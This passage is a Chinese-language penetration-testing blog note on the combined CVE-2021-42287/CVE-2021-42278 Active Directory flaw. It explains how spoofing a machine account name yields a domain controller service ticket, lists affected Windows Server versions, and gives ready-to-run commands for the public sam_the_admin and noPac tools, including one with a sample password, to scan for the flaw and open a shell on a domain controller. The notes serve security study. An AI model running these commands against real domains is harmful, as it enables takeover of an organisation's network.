<h2 id="cve-2021-42287-x2F-cve-2021-42278"><a href="#cve-2021-42287-x2F-cve-2021-42278" class="headerlink" title="cve-2021-42287&#x2F;cve-2021-42278"></a>cve-2021-42287&#x2F;cve-2021-42278</h2><h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>去年爆出的域提权漏洞，通过两个漏洞·联合域提权</p>
<h5 id="1、CVE-2021-42278"><a href="#1、CVE-2021-42278" class="headerlink" title="1、CVE-2021-42278"></a>1、CVE-2021-42278</h5><p>一般来说，机器账号的名字应该以<code>$符号结尾的。例如DC$</code>表示DC这台主机的账户名。但是微软只是进行了规定，<strong>并没有验证程序对用户创建的用户名进行验证</strong>，也就是说，创建DC用户名完全是可以的。（这里指的是机器账号的SAMAccountName属性）</p>
<h5 id="2、CVE-2021-42287"><a href="#2、CVE-2021-42287" class="headerlink" title="2、CVE-2021-42287"></a>2、CVE-2021-42287</h5><p>结合上面那个漏洞，如果创建了一个用户名为DC的账户，此时使用这个账户去申请一张TGT票据，然后在申请ST之前，将这个账户名修改掉或者删除掉，那么在进行申请ST(SESSION Ticket？）的时候，KDC在进行验证时就查不到这个账户，此时KDC就会去查找DC<code>$这个账户，如果这个账户存在的话，最终返回的就是DC$</code>这个账户申请的ST。<strong>也就相当于获取到了域控账户申请的高权限服务票据</strong>。</p>
<h4 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h4><pre><code>Windows Server 2012 R2 (Server Core installation) 
Windows Server 2012 R2 
Windows Server 2012 (Server Core installation) 
Windows Server 2012 
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) 
Windows Server 2008 R2 for x64-based Systems Service Pack 1 
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) 
Windows Server 2008 for x64-based Systems Service Pack 2 
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) 
Windows Server 2008 for 32-bit Systems Service Pack 2 
Windows Server 2016 (Server Core installation) 
Windows Server 2016 
Windows Server, version 20H2 (Server Core Installation) 
Windows Server, version 2004 (Server Core installation) 
Windows Server 2022 (Server Core installation) 
Windows Server 2022 
Windows Server 2019 (Server Core installation) 
Windows Server 2019
</code></pre>
<h4 id="利用（简单）："><a href="#利用（简单）：" class="headerlink" title="利用（简单）："></a>利用（简单）：</h4><blockquote>
<p>工具<a target="_blank" rel="noopener" href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
</blockquote>
<p>需要一个域用户  ，有域用户普通权限即可创建</p>
<p><strong>sam_the_admin.py</strong>获取dc shell(看情况是否通过代理运行	)</p>
<pre><code>可能需要先安装模块
python3 sam_the_admin.py 域名（x.x）/用户名：密码 -dc-ip x.x.x.x -shell 
</code></pre>
<p><strong>noPac.exe</strong>检查漏洞是否存在</p>
<pre><code>.\noPac.exe scan -domain x.x.x -user x -pass &#39;x&#39; 
</code></pre>
<p>获取shell</p>
<pre><code>proxychains python3 noPac.py -use-ldap de1ay.com/de1ay:1qaz@WSX -dc-ip 10.10.10.10 -shell
</code></pre>
<hr>
<h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote>
<p>- </p>
</blockquote>
<blockquote>
<p><strong>声明：</strong></p>
<ol>
<li><p>若文章存在错误，望诸君不吝指正^</p>
</li>
<li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p>
</li>
</ol>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://11pmsleep.github.io">晚上十一点睡觉</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://11pmsleep.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/0x23-%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%8F%90%E6%9D%83.html">https://11pmsleep.github.io/渗透测试/内网/权限提升/0x23-域环境提权.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://11pmsleep.github.io" target="_blank">晚上十一点睡觉</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237515.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/0x22-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83.html"><img class="prev-cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237572.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">0x22 - 渗透测试框架提权</div></div></a></div><div class="next-post pull-right"><a href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/5.%20%E5%87%BD%E6%95%B0%E8%BF%9B%E9%98%B6.html"><img class="next-cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237554.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">5. 函数进阶</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151640204.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">晚上十一点睡觉</div><div class="author-info__description">晚上十一点のBlog</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">101</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">62</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">41</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/11pmsleep"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/11pmsleep" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:860637048@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=860637048" target="_blank" title="qq"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">笔记迁移整理中~~~以前习惯有道云记笔记，整理知识也算沉淀自己的一部分吧·· 加油··stay passionate and never say die!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%8F%90%E6%9D%83%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">域提权简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">Netlogon域权限提升概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">前置知识：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A"><span class="toc-number">1.1.3.</span> <span class="toc-text">影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%AE%8C%E6%95%B4%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.1.4.</span> <span class="toc-text">域内提权漏洞完整步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MS14-068"><span class="toc-number">1.2.</span> <span class="toc-text">MS14-068</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.1.</span> <span class="toc-text">Kerberos 漏洞:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E8%83%BD%E4%BC%9A%E4%BD%BF%E7%94%A8%E8%AF%A5%E6%BC%8F%E6%B4%9E%E6%89%A7%E8%A1%8C%E5%93%AA%E4%BA%9B%E6%93%8D%E4%BD%9C%EF%BC%9F"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">攻击者可能会使用该漏洞执行哪些操作？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E8%AF%A5%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">攻击者如何利用该漏洞？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A5%E6%BC%8F%E6%B4%9E%E4%B8%BB%E8%A6%81%E5%8D%B1%E5%AE%B3%E5%93%AA%E4%BA%9B%E7%B3%BB%E7%BB%9F%EF%BC%9F"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">该漏洞主要危害哪些系统？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Kerberos%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">Kerberos认证原理:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Kerberos%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.5.</span> <span class="toc-text">Kerberos漏洞原理:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">漏洞利用前提：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.2.3.</span> <span class="toc-text">相关工具下载:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.4.</span> <span class="toc-text">漏洞利用:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2021-42287-x2F-cve-2021-42278"><span class="toc-number">1.3.</span> <span class="toc-text">cve-2021-42287&#x2F;cve-2021-42278</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">漏洞介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81CVE-2021-42278"><span class="toc-number">1.3.0.1.1.</span> <span class="toc-text">1、CVE-2021-42278</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81CVE-2021-42287"><span class="toc-number">1.3.0.1.2.</span> <span class="toc-text">2、CVE-2021-42287</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">漏洞影响范围</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%EF%BC%88%E7%AE%80%E5%8D%95%EF%BC%89%EF%BC%9A"><span class="toc-number">1.3.0.3.</span> <span class="toc-text">利用（简单）：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#refer"><span class="toc-number">2.</span> <span class="toc-text">refer</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html" title="反序列化漏洞"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308763.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="反序列化漏洞"/></a><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html" title="反序列化漏洞">反序列化漏洞</a><time datetime="2022-11-23T16:53:57.062Z" title="更新于 2022-11-24 00:53:57">2022-11-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/hexo%E6%95%99%E7%A8%8B/%E7%BD%91%E7%AB%99SEO%E4%BC%98%E5%8C%96.html" title="网站SEO优化"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237561.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网站SEO优化"/></a><div class="content"><a class="title" href="/hexo%E6%95%99%E7%A8%8B/%E7%BD%91%E7%AB%99SEO%E4%BC%98%E5%8C%96.html" title="网站SEO优化">网站SEO优化</a><time datetime="2022-11-23T12:35:18.808Z" title="更新于 2022-11-23 20:35:18">2022-11-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/hw%E9%9D%A2%E8%AF%95%E9%A2%98.html" title="hw面试题"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308750.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hw面试题"/></a><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/hw%E9%9D%A2%E8%AF%95%E9%A2%98.html" title="hw面试题">hw面试题</a><time datetime="2022-11-21T18:08:14.527Z" title="更新于 2022-11-22 02:08:14">2022-11-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E.html" title="常见中间件解析漏洞"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237557.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="常见中间件解析漏洞"/></a><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E.html" title="常见中间件解析漏洞">常见中间件解析漏洞</a><time datetime="2022-11-21T18:06:17.875Z" title="更新于 2022-11-22 02:06:17">2022-11-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/ThinkPHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93.html" title="ThinkPHP框架漏洞总结"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308749.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ThinkPHP框架漏洞总结"/></a><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/ThinkPHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93.html" title="ThinkPHP框架漏洞总结">ThinkPHP框架漏洞总结</a><time datetime="2022-11-21T17:47:38.178Z" title="更新于 2022-11-22 01:47:38">2022-11-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 晚上十一点睡觉</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to 11pmsleep's blog ~~~ 该网站用来记录学习笔记及生活，欢迎交流技术~~~Blog仅供个人记录笔记学习所用，若有侵权，联系我删除~若有错误，也望诸君不吝指正</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (true){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://twikoo.gungnir.top/',
      region: '',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikoo.gungnir.top/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      countELement.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    GLOBAL_CONFIG_SITE.isPost && getCount()
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>